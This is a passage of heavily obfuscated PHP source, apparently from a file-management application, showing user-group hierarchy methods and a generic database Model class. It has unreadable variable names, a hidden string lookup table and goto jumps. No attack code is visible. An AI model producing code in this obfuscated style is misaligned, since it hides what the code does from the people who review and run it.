$ÍÕšËÅ = $this->parentLevelArray($»ËÁ¶°[$†ô§Ÿ”[584]]); $ÍÕšËÅ[] = $œƒìÇ”; foreach ($ÍÕšËÅ as $œƒìÇ”) { if (in_array($œƒìÇ” . $†ô§Ÿ”[12], $•‡àƒ‡)) { return !0; } } return !1; } private function _listAppendParent(&$æ®Ä¼­Í) { $–É¤Ùğ =& $_SERVER[óÔë„ú]; $ŸÉêêÊ° = array(); foreach ($æ®Ä¼­Í as &$Ôº¡Òà) { $ŸÉêêÊ°[$Ôº¡Òà[$–É¤Ùğ[1957]]] = $Ôº¡Òà[$–É¤Ùğ[32]]; $Ù¡Ğ•û = $this->parentLevelArray($Ôº¡Òà[$–É¤Ùğ[584]]); foreach ($Ù¡Ğ•û as $›–Ä¥öç) { if (!isset($ŸÉêêÊ°[$›–Ä¥öç])) { $ŸÉêêÊ°[$›–Ä¥öç] = 0; } } } unset($Ôº¡Òà); foreach ($ŸÉêêÊ° as $¨ñ áëÃ => $åŒÆ¬Ë™) { if ($åŒÆ¬Ë™) { continue; } $çªëü•Û = $this->getInfoSimple($¨ñ áëÃ); $ŸÉêêÊ°[$¨ñ áëÃ] = $çªëü•Û[$–É¤Ùğ[32]]; } $¸§³‹ÚÉ = $GLOBALS[$–É¤Ùğ[6]][$–É¤Ùğ[92]][$–É¤Ùğ[2064]]; if (KodUser::isRoot()) { $¸§³‹ÚÉ = !1; } foreach ($æ®Ä¼­Í as &$Ôº¡Òà) { $Ù¡Ğ•û = $this->parentLevelArray($Ôº¡Òà[$–É¤Ùğ[584]]); $àœçƒó¸ = $–É¤Ùğ[12]; foreach ($Ù¡Ğ•û as $¨ñ áëÃ => $›–Ä¥öç) { if ($¸§³‹ÚÉ && $¨ñ áëÃ == 0) { continue; } $àœçƒó¸ .= $ŸÉêêÊ°[$›–Ä¥öç] . $–É¤Ùğ[8]; } if ($Ù¡Ğ•û) { $àœçƒó¸ .= $Ôº¡Òà[$–É¤Ùğ[32]]; } $Ôº¡Òà[$–É¤Ùğ[589]] = str_replace($–É¤Ùğ[592], $–É¤Ùğ[8], $àœçƒó¸); } unset($Ôº¡Òà); } private function _listAppendSourceRoot(&$ÉÒñç–Ê, $èùœ²û±) { $‹ü£şÓÃ =& $_SERVER[óÔë„ú]; $î†¾âİä = Model($‹ü£şÓÃ[884])->listSourceRoot(SourceModel::TYPE_GROUP, $èùœ²û±); $î†¾âİä = array_to_keyvalue($î†¾âİä, $‹ü£şÓÃ[569]); $î†¾âİä = array_remove_key($î†¾âİä, $‹ü£şÓÃ[569]); foreach ($ÉÒñç–Ê as &$Ê´ËÃß²) { $Ê´ËÃß²[$‹ü£şÓÃ[90]] = $î†¾âİä[$Ê´ËÃß²[$‹ü£şÓÃ[1957]]] ? $î†¾âİä[$Ê´ËÃß²[$‹ü£şÓÃ[1957]]] : array(); } unset($Ê´ËÃß²); } protected function groupMerge($ş¸¥’é÷) { $ş¸¥’é÷ = array_values(array_unique($ş¸¥’é÷)); $¾ö¯‡ïŸ = array(); for ($á€¦²¯œ = 0; $á€¦²¯œ < count($ş¸¥’é÷); $á€¦²¯œ++) { $±ç«ŒÒ³ = !1; for ($¯®•ĞÉÇ = 0; $¯®•ĞÉÇ < count($ş¸¥’é÷); $¯®•ĞÉÇ++) { if ($á€¦²¯œ == $¯®•ĞÉÇ) { continue; } if ($this->isParentOf($ş¸¥’é÷[$¯®•ĞÉÇ], $ş¸¥’é÷[$á€¦²¯œ])) { $±ç«ŒÒ³ = !0; break; } } if (!$±ç«ŒÒ³) { $¾ö¯‡ïŸ[] = $ş¸¥’é÷[$á€¦²¯œ]; } } return $¾ö¯‡ïŸ; } protected function isParentOf($ìœù—ãà, $™Á¨ËûÙ) { $úİ€Â =& $_SERVER[óÔë„ú]; if (!$ìœù—ãà || !$™Á¨ËûÙ || $ìœù—ãà == $™Á¨ËûÙ) { return !1; } $ËÃßç— = $this->getInfoSimple($ìœù—ãà); $ÊÌÓ¡ü© = $this->getInfoSimple($™Á¨ËûÙ); $ôş»éº° = $ËÃßç—[$úİ€Â[584]] . $ìœù—ãà . $úİ€Â[50]; if (substr($ÊÌÓ¡ü©[$úİ€Â[584]], 0, strlen($ôş»éº°)) == $ôş»éº°) { return !0; } return !1; } public function groupShowRoot($ĞÊ½†ÔÀ, $çñ©¾£¾ = false) { $»èØşö =& $_SERVER[óÔë„ú]; $­œŸŸê© = $this->getInfo($ĞÊ½†ÔÀ); if (!$­œŸŸê©) { return array(); } $£ñä°¨ = $this->parentLevelArray($­œŸŸê©[$»èØşö[584]]); $ïæ™‹ = array($ĞÊ½†ÔÀ); if (count($£ñä°¨) == 0) { return $ïæ™‹; } if ($çñ©¾£¾ && count($£ñä°¨) == 1) { return $ïæ™‹; } if (!$­œŸŸê©[$»èØşö[539]] || !isset($­œŸŸê©[$»èØşö[539]][$»èØşö[2047]]) || $­œŸŸê©[$»èØşö[539]][$»èØşö[2047]] == $»èØşö[836]) { return $this->groupShowRoot($£ñä°¨[count($£ñä°¨) - 1], $çñ©¾£¾); } if ($­œŸŸê©[$»èØşö[539]][$»èØşö[2047]] == $»èØşö[433]) { $†Ò±¤Ùú = explode($»èØşö[50], $­œŸŸê©[$»èØşö[539]][$»èØşö[2048]]); if ($†Ò±¤Ùú) { $ïæ™‹ = array_merge($ïæ™‹, $†Ò±¤Ùú); } } return $ïæ™‹; } protected function resetParentLevel() { $êÄ×ã„Ù =& $_SERVER[óÔë„ú]; $”ÉĞß×€ = $êÄ×ã„Ù[1957]; $ÍşªïÜ = $this->select(); $ÍşªïÜ = array_to_keyvalue($ÍşªïÜ, $”ÉĞß×€); foreach ($ÍşªïÜ as $±¶Î˜ÁÖ) { $ÊêÑ‘ğŞ = $±¶Î˜ÁÖ; $ç »¡Ä = array(); while ($ÊêÑ‘ğŞ[$êÄ×ã„Ù[192]] != 0) { $ç »¡Ä[] = $ÊêÑ‘ğŞ[$êÄ×ã„Ù[192]]; $ÊêÑ‘ğŞ = $ÍşªïÜ[$ÊêÑ‘ğŞ[$êÄ×ã„Ù[192]]]; } $ç »¡Ä[] = 0; $ç »¡Ä = $êÄ×ã„Ù[50] . implode($êÄ×ã„Ù[50], array_reverse($ç »¡Ä)) . $êÄ×ã„Ù[50]; $this->setNamePinyin($±¶Î˜ÁÖ[$”ÉĞß×€], $±¶Î˜ÁÖ[$êÄ×ã„Ù[32]]); $this->where(array($”ÉĞß×€ => $±¶Î˜ÁÖ[$”ÉĞß×€]))->save(array($êÄ×ã„Ù[652] => $ç »¡Ä)); } return $ÍşªïÜ; } public function groupNameAuto($À¶‹à, $„ŠÒÉû) { $˜Ñ¶œÉÅ =& $_SERVER[óÔë„ú]; $üŞ™ÇğŸ = $this->where(array($˜Ñ¶œÉÅ[477] => $À¶‹à))->getField($˜Ñ¶œÉÅ[32], !0); if (!$üŞ™ÇğŸ || !in_array($„ŠÒÉû, $üŞ™ÇğŸ)) { return $„ŠÒÉû; } for ($ÓĞÜÕşû = 1; $ÓĞÜÕşû <= count($üŞ™ÇğŸ) + 1; $ÓĞÜÕşû++) { $§æÄÈ°È = $„ŠÒÉû . "\x28{$ÓĞÜÕşû}\51"; if (!in_array($§æÄÈ°È, $üŞ™ÇğŸ)) { return $§æÄÈ°È; } } } public function groupSwitch($§æ’µ‰, $°ƒß”‰ä) { $ÉŞÂç’£ =& $_SERVER[óÔë„ú]; $³–‡™çÚ = array($ÉŞÂç’£[1957] => array($ÉŞÂç’£[7], array($§æ’µ‰, $°ƒß”‰ä))); $İÓª œ = $this->where($³–‡™çÚ)->select(); $İÓª œ = array_to_keyvalue($İÓª œ, $ÉŞÂç’£[1957]); if (!isset($İÓª œ[$§æ’µ‰]) || !isset($İÓª œ[$°ƒß”‰ä]) || $İÓª œ[$§æ’µ‰][$ÉŞÂç’£[192]] == 0) { return !1; } $³–‡™çÚ = array($ÉŞÂç’£[1957] => $§æ’µ‰); $†î³º‚à = Model($ÉŞÂç’£[2051])->where($³–‡™çÚ)->select(); if (!$†î³º‚à) { $†î³º‚à = array(); } foreach ($†î³º‚à as $¶‹ì¾Ò†) { $›·¿×û† = $¶‹ì¾Ò†[$ÉŞÂç’£[1758]]; $³–‡™çÚ = array($ÉŞÂç’£[1758] => $›·¿×û†, $ÉŞÂç’£[1957] => $°ƒß”‰ä); $—èéÇûÖ = Model($ÉŞÂç’£[2051])->where($³–‡™çÚ)->find(); if (!$—èéÇûÖ) { $›éàôÈº = array($°ƒß”‰ä => $¶‹ì¾Ò†[$ÉŞÂç’£[2065]]); Model($ÉŞÂç’£[598])->userGroupAdd($›·¿×û†, $›éàôÈº); } Model($ÉŞÂç’£[598])->userGroupRemove($›·¿×û†, $§æ’µ‰); } $³–‡™çÚ = array($ÉŞÂç’£[190] => 2, $ÉŞÂç’£[192] => 0, $ÉŞÂç’£[485] => 1, $ÉŞÂç’£[569] => array($ÉŞÂç’£[7], array($§æ’µ‰, $°ƒß”‰ä))); $ò²ÒîÕ’ = Model($ÉŞÂç’£[884])->where($³–‡™çÚ)->field($ÉŞÂç’£[2066])->select(); $ò²ÒîÕ’ = array_to_keyvalue($ò²ÒîÕ’, $ÉŞÂç’£[569], $ÉŞÂç’£[193]); $†ÉÍÀâÒ = !empty($ò²ÒîÕ’[$§æ’µ‰]) ? $ò²ÒîÕ’[$§æ’µ‰] : !1; if ($†ÉÍÀâÒ) { if (!$ò²ÒîÕ’[$°ƒß”‰ä]) { $ò²ÒîÕ’[$°ƒß”‰ä] = Model($ÉŞÂç’£[884])->groupRootAdd($°ƒß”‰ä); } $¼úåüÏ‹ = $ò²ÒîÕ’[$°ƒß”‰ä]; $³–‡™çÚ = array($ÉŞÂç’£[192] => $†ÉÍÀâÒ); $ò²ÒîÕ’ = Model($ÉŞÂç’£[884])->where($³–‡™çÚ)->field($ÉŞÂç’£[2067])->select(); if (!$ò²ÒîÕ’) { $ò²ÒîÕ’ = array(); } Model($ÉŞÂç’£[884])->moveClearAuth = !1; foreach ($ò²ÒîÕ’ as $¥Ø×Í¡ô) { $ª¹ÓŒşõ = $¥Ø×Í¡ô[$ÉŞÂç’£[485]] == $ÉŞÂç’£[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÉŞÂç’£[884])->move($¥Ø×Í¡ô[$ÉŞÂç’£[193]], $¼úåüÏ‹, $ª¹ÓŒşõ); } Model($ÉŞÂç’£[884])->moveClearAuth = !0; $³–‡™çÚ = array($ÉŞÂç’£[190] => 2, $ÉŞÂç’£[569] => $§æ’µ‰); $éßü›¾Ø = array($ÉŞÂç’£[569] => $°ƒß”‰ä); Model($ÉŞÂç’£[2068])->where($³–‡™çÚ)->save($éßü›¾Ø); Model($ÉŞÂç’£[2069])->where($³–‡™çÚ)->save($éßü›¾Ø); } $this->_changeChildLevel($İÓª œ[$§æ’µ‰], $İÓª œ[$°ƒß”‰ä], !0); $this->where(array($ÉŞÂç’£[192] => $§æ’µ‰))->save(array($ÉŞÂç’£[192] => $°ƒß”‰ä)); $this->_clearChildrenCache($İÓª œ[$°ƒß”‰ä]); return !0; } } goto FñŸòøâİé; D’Ë™šÑ³: define($_SERVER[óÔë„ú][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\157\x72\144\x65\162", "\141\154\151\x61\x73", "\150\x61\166\x69\156\x67", "\147\x72\x6f\165\x70", "\x6c\x6f\x63\153", "\x64\x69\x73\x74\151\x6e\x63\164", "\x61\x75\x74\157", "\x66\151\154\164\x65\x72", "\166\x61\154\x69\x64\x61\x74\145", "\162\145\163\165\154\164", "\x62\151\x6e\x64", "\x74\157\153\x65\x6e"); public function __construct($‹ ÃÔ°­ = '', $Â÷¦®•˜ = '', $Ÿ§…ñÄ² = '') { $ÜÀüš¨» =& $_SERVER[óÔë„ú]; $this->_initialize(); if (!empty($‹ ÃÔ°­)) { if (strpos($‹ ÃÔ°­, $ÜÀüš¨»[10])) { list($this->dbName, $this->name) = explode($ÜÀüš¨»[10], $‹ ÃÔ°­); } else { $this->name = $‹ ÃÔ°­; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Â÷¦®•˜)) { $this->tablePrefix = $ÜÀüš¨»[12]; } elseif ($ÜÀüš¨»[12] != $Â÷¦®•˜) { $this->tablePrefix = $Â÷¦®•˜; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ÜÀüš¨»[321]); } $this->db(0, empty($this->connection) ? $Ÿ§…ñÄ² : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $À¯‡Ó½› =& $_SERVER[óÔë„ú]; if (empty($this->fields)) { if (think_config($À¯‡Ó½›[322])) { $ü¤È··¬ = $this->dbName ? $this->dbName : think_config($À¯‡Ó½›[323]); $ì€»¨¬Ú = think_var_cache($À¯‡Ó½›[324] . strtolower(get_path_this($ü¤È··¬) . $À¯‡Ó½›[10] . $this->name)); if ($ì€»¨¬Ú) { $İ•³Øòá = think_config($À¯‡Ó½›[325]); if (empty($İ•³Øòá) || $ì€»¨¬Ú[$À¯‡Ó½›[326]] == $İ•³Øòá) { $this->fields = $ì€»¨¬Ú; return; } } } $this->flush(); } } public function flush() { $¥‰¬Ò©æ =& $_SERVER[óÔë„ú]; $this->db->setModel($this->name); $í¥ù¾ = $this->db->getFields($this->getTableName()); if (!$í¥ù¾) { return !1; } $this->fields = array_keys($í¥ù¾); $this->fields[$¥‰¬Ò©æ[327]] = !1; foreach ($í¥ù¾ as $—ˆÌ¾±ä => $Ôı±²‘Å) { $Ü–ÅŞ²ó[$—ˆÌ¾±ä] = $Ôı±²‘Å[$¥‰¬Ò©æ[33]]; if ($Ôı±²‘Å[$¥‰¬Ò©æ[39]]) { $this->fields[$¥‰¬Ò©æ[328]] = $—ˆÌ¾±ä; if ($Ôı±²‘Å[$¥‰¬Ò©æ[42]]) { $this->fields[$¥‰¬Ò©æ[327]] = !0; } } } $this->fields[$¥‰¬Ò©æ[329]] = $Ü–ÅŞ²ó; if (think_config($¥‰¬Ò©æ[325])) { $this->fields[$¥‰¬Ò©æ[326]] = think_config($¥‰¬Ò©æ[325]); } if (think_config($¥‰¬Ò©æ[322])) { $Œ”ºâ‰ù = $this->dbName ? $this->dbName : think_config($¥‰¬Ò©æ[323]); think_var_cache($¥‰¬Ò©æ[324] . strtolower(get_path_this($Œ”ºâ‰ù) . $¥‰¬Ò©æ[10] . $this->name), $this->fields); } } public function switchModel($í­ËÔŠ¨, $ôÜÜáïú = array()) { $µ×Ù³»Ÿ =& $_SERVER[óÔë„ú]; $øÓ¦—ÎË = ucwords(strtolower($í­ËÔŠ¨)) . $µ×Ù³»Ÿ[330]; if (!class_exists($øÓ¦—ÎË)) { think_exception($øÓ¦—ÎË . think_lang($µ×Ù³»Ÿ[331])); } $this->_extModel = new $øÓ¦—ÎË($this->name); if (!empty($ôÜÜáïú)) { foreach ($ôÜÜáïú as $ŸßåØ™) { $this->_extModel->setProperty($ŸßåØ™, $this->{$ŸßåØ™}); } } return $this->_extModel; } public function __set($ª§¯œ·¯, $ óÚ…º®) { $this->data[$ª§¯œ·¯] = $ óÚ…º®; } public function __get($­Ü€€õ) { return isset($this->data[$­Ü€€õ]) ? $this->data[$­Ü€€õ] : null; } public function __isset($Æ°ô¡Œ€) { return isset($this->data[$Æ°ô¡Œ€]); } public function __unset($Ÿåªò…ø) { unset($this->data[$Ÿåªò…ø]); } public function __call($ùñ†•¦•, $ß°¿–îù) { $„Ù„ğŞÈ =& $_SERVER[óÔë„ú]; if (in_array(strtolower($ùñ†•¦•), $this->methods, !0)) { $this->options[strtolower($ùñ†•¦•)] = $ß°¿–îù[0]; return $this; } elseif (in_array(strtolower($ùñ†•¦•), array($„Ù„ğŞÈ[332], $„Ù„ğŞÈ[333], $„Ù„ğŞÈ[334], $„Ù„ğŞÈ[335], $„Ù„ğŞÈ[336]), !0)) { $©ë¹Ãù‰ = isset($ß°¿–îù[0]) ? $ß°¿–îù[0] : $„Ù„ğŞÈ[220]; $©ë¹Ãù‰ = $this->db->parseKey($©ë¹Ãù‰); return $this->getField(strtoupper($ùñ†•¦•) . $„Ù„ğŞÈ[337] . $©ë¹Ãù‰ . $„Ù„ğŞÈ[338] . $ùñ†•¦•, $„Ù„ğŞÈ[332]); } elseif (strtolower(substr($ùñ†•¦•, 0, 5)) == $„Ù„ğŞÈ[339]) { $©ë¹Ãù‰ = think_parse_name(substr($ùñ†•¦•, 5)); $†§ÎÈ®•[$©ë¹Ãù‰] = $ß°¿–îù[0]; return $this->where($†§ÎÈ®•)->find(); } elseif (strtolower(substr($ùñ†•¦•, 0, 10)) == $„Ù„ğŞÈ[340]) { $È‡ ²èã = think_parse_name(substr($ùñ†•¦•, 10)); $†§ÎÈ®•[$È‡ ²èã] = $ß°¿–îù[0]; return $this->where($†§ÎÈ®•)->getField($ß°¿–îù[1]); } elseif (isset($this->_scope[$ùñ†•¦•])) { return $this->scope($ùñ†•¦•, $ß°¿–îù[0]); } elseif (method_exists($this, $ùñ†•¦•)) { array_unshift($ß°¿–îù, $ùñ†•¦•); return call_user_func_array(array($this, $„Ù„ğŞÈ[341]), $ß°¿–îù); } else { return call_user_func_array(array(parent, $ùñ†•¦•), $ß°¿–îù); } } protected function call() { $ó©£÷“° =& $_SERVER[óÔë„ú]; $¢Ë¥‚À = func_get_args(); $ôÎí£¡€ = array_shift($¢Ë¥‚À); $ƒ¿™ğÉÏ = $ôÎí£¡€; if (is_array($ôÎí£¡€)) { $ƒ¿™ğÉÏ = $ôÎí£¡€[1]; $ôÎí£¡€ = $ôÎí£¡€[0]; } $úáÂÁú× = count($¢Ë¥‚À) - 1; if (isset($¢Ë¥‚À[$úáÂÁú×]) && $¢Ë¥‚À[$úáÂÁú×] === $ôÎí£¡€) { think_exception(__CLASS__ . $ó©£÷“°[4] . $ôÎí£¡€ . think_lang($ó©£÷“°[342])); return; } $¢Ë¥‚À[] = $ôÎí£¡€; if (method_exists($this, $ó©£÷“°[343])) { $òˆÒÃ Ÿ = call_user_func_array(array($this, $ó©£÷“°[344]), array($ƒ¿™ğÉÏ, $¢Ë¥‚À)); if (!is_null($òˆÒÃ Ÿ) && $òˆÒÃ Ÿ !== !1) { return $òˆÒÃ Ÿ; } } $“ğÊüÕ = call_user_func_array(array($this, $ôÎí£¡€), $¢Ë¥‚À); if (method_exists($this, $ó©£÷“°[345])) { $òˆÒÃ Ÿ = call_user_func_array(array($this, $ó©£÷“°[346]), array($ƒ¿™ğÉÏ, $¢Ë¥‚À, $“ğÊüÕ)); if ($òˆÒÃ Ÿ) { return $òˆÒÃ Ÿ; } } return $“ğÊüÕ; } protected function _initialize() { } protected function _facade($àò®ôÒâ) { $ÈÉÎÛæˆ =& $_SERVER[óÔë„ú]; if (!empty($this->fields)) { foreach ($àò®ôÒâ as $´¾¦µÖ™ => $§çüñëİ) { if (is_array($this->fields) && !in_array($´¾¦µÖ™, $this->fields, !0)) { unset($àò®ôÒâ[$´¾¦µÖ™]); } elseif (is_scalar($§çüñëİ)) { $this->_parseType($àò®ôÒâ, $´¾¦µÖ™); } } } if (!empty($this->options[$ÈÉÎÛæˆ[347]])) { $àò®ôÒâ = array_map($this->options[$ÈÉÎÛæˆ[347]], $àò®ôÒâ); unset($this->options[$ÈÉÎÛæˆ[347]]); } $this->_beforeWrite($àò®ôÒâ); return $àò®ôÒâ; } protected function _beforeWrite(&$°Ê¦ÔÚË) { } public function add($ŸŠùû¶’ = '', $­ƒæ£Ä = array(), $Úû…ã£ò = false) { if (empty($ŸŠùû¶’)) { if (!empty($this->data)) { $ŸŠùû¶’ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[óÔë„ú][348]); return !1; } } $­ƒæ£Ä = $this->_parseOptions($­ƒæ£Ä); $ŸŠùû¶’ = $this->_facade($ŸŠùû¶’); if (!1 === $this->_beforeInsert($ŸŠùû¶’, $­ƒæ£Ä)) { return !1; } $İ€ò­¼Ğ = $this->db->insert($ŸŠùû¶’, $­ƒæ£Ä, $Úû…ã£ò); if (!1 !== $İ€ò­¼Ğ) { $üÙ¿õÌÃ = $this->getLastInsID(); if ($üÙ¿õÌÃ) { $ŸŠùû¶’[$this->getPk()] = $üÙ¿õÌÃ; $this->_after_insert($ŸŠùû¶’, $­ƒæ£Ä); return $üÙ¿õÌÃ; } $this->_after_insert($ŸŠùû¶’, $­ƒæ£Ä); } return $İ€ò­¼Ğ; } protected function _beforeInsert(&$ô¨È—š, $ôÌÂ“¯) { } protected function _after_insert($Æê¸©, $ŸõŞÇõ’) { } public function addAll($Ò¬ÚÈâ£, $ŒâäïÆ§ = array(), $šÏï× = false) { $ùáòğ›‘ =& $_SERVER[óÔë„ú]; if (empty($Ò¬ÚÈâ£)) { $this->error = think_lang($ùáòğ›‘[348]); return !1; } $ŒâäïÆ§ = $this->_parseOptions($ŒâäïÆ§); foreach ($Ò¬ÚÈâ£ as $ó‰¸‡ => $¿‡…†Š™) { $Ò¬ÚÈâ£[$ó‰¸‡] = $this->_facade($¿‡…†Š™); } if (method_exists($this->db, $ùáòğ›‘[349])) { $ÓªøüÏ£ = $this->db->insertAll($Ò¬ÚÈâ£, $ŒâäïÆ§, $šÏï×); } else { $this->startTrans(); foreach ($Ò¬ÚÈâ£ as $ó‰¸‡ => $¿‡…†Š™) { $ÓªøüÏ£ = $this->db->insert($¿‡…†Š™, $ŒâäïÆ§, $šÏï×); } $this->commit(); } if (!1 !== $ÓªøüÏ£) { $Ğœò¦ë¬ = $this->getLastInsID(); if ($Ğœò¦ë¬) { return $Ğœò¦ë¬; } } return $ÓªøüÏ£; } public function selectAdd($‡‹×É£ = '', $‘É—ëæ = '', $¿™Å£óò = array()) { $äÎÕÇ† =& $_SERVER[óÔë„ú]; $¿™Å£óò = $this->_parseOptions($¿™Å£óò); if (!1 === ($ÓÓÆ‡ÇÁ = $this->db->selectInsert($‡‹×É£ ? $‡‹×É£ : $¿™Å£óò[$äÎÕÇ†[350]], $‘É—ëæ ? $‘É—ëæ : $this->getTableName(), $¿™Å£óò))) { $this->error = think_lang($äÎÕÇ†[351]); return !1; } else { return $ÓÓÆ‡ÇÁ; } } public function save($Ï«ßüğ… = '', $ê‹®üº = array()) { $û¥‚ŒÉÌ =& $_SERVER[óÔë„ú]; if (empty($Ï«ßüğ…)) { if (!empty($this->data)) { $Ï«ßüğ… = $this->data; $this->data = array(); } else { $this->error = think_lang($û¥‚ŒÉÌ[348]); return !1; } } $Ï«ßüğ… = $this->_facade($Ï«ßüğ…); $ê‹®üº = $this->_parseOptions($ê‹®üº); $ÊŒæ Ò = $this->getPk(); if (!isset($ê‹®üº[$û¥‚ŒÉÌ[352]])) { if (isset($Ï«ßüğ…[$ÊŒæ Ò])) { $À’¸òïá[$ÊŒæ Ò] = $Ï«ßüğ…[$ÊŒæ Ò]; $ê‹®üº[$û¥‚ŒÉÌ[352]] = $À’¸òïá; unset($Ï«ßüğ…[$ÊŒæ Ò]); } else { $this->error = think_lang($û¥‚ŒÉÌ[351]); return !1; } } if (is_array($ê‹®üº[$û¥‚ŒÉÌ[352]]) && isset($ê‹®üº[$û¥‚ŒÉÌ[352]][$ÊŒæ Ò])) { $ØÑ¾¯ = $ê‹®üº[$û¥‚ŒÉÌ[352]][$ÊŒæ Ò]; } if (!1 === $this->_beforeUpdate($Ï«ßüğ…, $ê‹®üº)) { return !1; } $ÂÂ¾¿ï– = $this->db->update($Ï«ßüğ…, $ê‹®üº); if (!1 !== $ÂÂ¾¿ï–) { if (isset($ØÑ¾¯)) { $Ï«ßüğ…[$ÊŒæ Ò] = $ØÑ¾¯; } $this->_afterUpdate($Ï«ßüğ…, $ê‹®üº); } return $ÂÂ¾¿ï–; } protected function _beforeUpdate(&$êÇØĞ„, $ôÒ¡«Û¸) { } protected function _afterUpdate($ª¯ö‹›, $áåéºû±) { } public function delete($åªÍİù = array()) { $˜ÆÁÉ¢Ş =& $_SERVER[óÔë„ú]; if (empty($åªÍİù) && empty($this->options[$˜ÆÁÉ¢Ş[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ªïõ×£ = $this->getPk(); if (is_numeric($åªÍİù) || is_string($åªÍİù)) { if (strpos($åªÍİù, $˜ÆÁÉ¢Ş[50])) { $öâŒó¸[$ªïõ×£] = array($˜ÆÁÉ¢Ş[353], $åªÍİù); } else { $öâŒó¸[$ªïõ×£] = $åªÍİù; } $this->options[$˜ÆÁÉ¢Ş[352]] = $öâŒó¸; } $åªÍİù = $this->_parseOptions(); if (is_array($åªÍİù[$˜ÆÁÉ¢Ş[352]]) && isset($åªÍİù[$˜ÆÁÉ¢Ş[352]][$ªïõ×£])) { $Öœ¤« = $åªÍİù[$˜ÆÁÉ¢Ş[352]][$ªïõ×£]; } $„Àß…í— = $this->db->delete($åªÍİù); if (!1 !== $„Àß…í—) { $¼•öÙñˆ = array(); if (isset($Öœ¤«)) { $¼•öÙñˆ[$ªïõ×£] = $Öœ¤«; } $this->_after_delete($¼•öÙñˆ, $åªÍİù); } return $„Àß…í—; } protected function _after_delete($®ã©»ßª, $å„ŒıØÑ) { } public function select($¬½éÄƒ¬ = array()) { $èéıÜí„ =& $_SERVER[óÔë„ú]; if (is_string($¬½éÄƒ¬) || is_numeric($¬½éÄƒ¬)) { $”Çë¢£ = $this->getPk(); if (strpos($¬½éÄƒ¬, $èéıÜí„[50])) { $©¢ÜŠ‹­[$”Çë¢£] = array($èéıÜí„[353], $¬½éÄƒ¬); } else { $©¢ÜŠ‹­[$”Çë¢£] = $¬½éÄƒ¬; } $this->options[$èéıÜí„[352]] = $©¢ÜŠ‹­; } elseif (!1 === $¬½éÄƒ¬) { $¬½éÄƒ¬ = $this->_parseOptions(); return $èéıÜí„[354] . $this->db->buildSelectSql($¬½éÄƒ¬) . $èéıÜí„[355]; } $¬½éÄƒ¬ = $this->_parseOptions(); $±Ÿ¢¢‚‡ = $this->db->select($¬½éÄƒ¬); if (!1 === $±Ÿ¢¢‚‡) { return !1; } if (empty($±Ÿ¢¢‚‡)) { return null; } $this->_afterSelect($±Ÿ¢¢‚‡, $¬½éÄƒ¬); return $±Ÿ¢¢‚‡; } protected function _afterSelect(&$ ‚ª¿ ´, $ÇÆåŒŠ) { } public function buildSql($»Ü½¹ = array()) { $‰ŒÑĞ°Æ =& $_SERVER[óÔë„ú]; $»Ü½¹ = $this->_parseOptions($»Ü½¹); return $‰ŒÑĞ°Æ[354] . $this->db->buildSelectSql($»Ü½¹) . $‰ŒÑĞ°Æ[355]; } public function optionsValue($îÏıàƒ = null) { if (is_null($îÏıàƒ)) { return $this->options; } elseif (is_array($îÏıàƒ)) { $this->options = array_merge($this->options, $îÏıàƒ); } } protected function _parseOptions($àˆÑİ¸ü = array()) { $æû±±—Ó =& $_SERVER[óÔë„ú]; if (is_array($àˆÑİ¸ü)) { $àˆÑİ¸ü = array_merge($this->options, $àˆÑİ¸ü); } $this->options = array(); if (!isset($àˆÑİ¸ü[$æû±±—Ó[356]])) { $àˆÑİ¸ü[$æû±±—Ó[356]] = $this->getTableName(); $¡êæ¢‚à = $this->fields; } else { $¡êæ¢‚à = $this->getDbFields(); } if (!empty($àˆÑİ¸ü[$æû±±—Ó[357]])) { $àˆÑİ¸ü[$æû±±—Ó[356]] .= $æû±±—Ó[53] . $àˆÑİ¸ü[$æû±±—Ó[357]]; } $àˆÑİ¸ü[$æû±±—Ó[358]] = $this->name; if (isset($àˆÑİ¸ü[$æû±±—Ó[352]]) && is_array($àˆÑİ¸ü[$æû±±—Ó[352]]) && !empty($¡êæ¢‚à) && !isset($àˆÑİ¸ü[$æû±±—Ó[359]]) && !isset($àˆÑİ¸ü[$æû±±—Ó[356]])) { foreach ($àˆÑİ¸ü[$æû±±—Ó[352]] as $¼ƒâ¾ßì => $ñ¶°•â°) { $¼ƒâ¾ßì = trim($¼ƒâ¾ßì); if (in_array($¼ƒâ¾ßì, $¡êæ¢‚à, !0)) { if (is_scalar($ñ¶°•â°)) { $this->_parseType($àˆÑİ¸ü[$æû±±—Ó[352]], $¼ƒâ¾ßì); } } elseif (!is_numeric($¼ƒâ¾ßì) && $æû±±—Ó[11] != substr($¼ƒâ¾ßì, 0, 1) && !1 === strpos($¼ƒâ¾ßì, $æû±±—Ó[10]) && !1 === strpos($¼ƒâ¾ßì, $æû±±—Ó[337]) && !1 === strpos($¼ƒâ¾ßì, $æû±±—Ó[214]) && !1 === strpos($¼ƒâ¾ßì, $æû±±—Ó[360])) { unset($àˆÑİ¸ü[$æû±±—Ó[352]][$¼ƒâ¾ßì]); } } } $this->_options_filter($àˆÑİ¸ü); return $àˆÑİ¸ü; } protected function _options_filter(&$Éßó±¨) { } protected function _parseType(&$İÂİ‡Ó³, $È‡İ‹Èä) { $âğùŸ„½ =& $_SERVER[óÔë„ú]; if (empty($this->options[$âğùŸ„½[361]][$âğùŸ„½[4] . $È‡İ‹Èä])) { $•æó‡è = strtolower($this->fields[$âğùŸ„½[329]][$È‡İ‹Èä]); if (!1 !== strpos($•æó‡è, $âğùŸ„½[362])) { } elseif (!1 === strpos($•æó‡è, $âğùŸ„½[363]) && !1 !== strpos($•æó‡è, $âğùŸ„½[364])) { $İÂİ‡Ó³[$È‡İ‹Èä] = intval($İÂİ‡Ó³[$È‡İ‹Èä]); } 